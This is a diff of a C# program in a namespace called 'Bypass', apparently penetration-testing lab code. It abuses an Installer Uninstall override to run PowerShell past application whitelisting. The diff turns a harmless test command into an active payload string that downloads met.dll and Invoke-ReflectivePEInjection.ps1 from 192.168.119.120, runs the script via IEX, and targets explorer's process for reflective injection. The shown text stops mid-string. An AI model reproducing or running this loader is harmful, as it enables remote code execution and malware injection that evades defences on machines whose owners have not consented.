@@ -5,7 +5,7 @@ using System.Configuration.Install;
 
 namespace Bypass
 {
-    class Program
+    class Entry
     {
         static void Main(string[] args)
         {
@@ -18,10 +18,9 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            string cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
 
             //example download dll  and reflectively load it into a process.
-            string example = "_ " +
+            string cmd = "_ " +
                 "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');_ " +
                 "(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX;_ " +
                 "$procid = (Get-Process -Name explorer).Id;_ " +
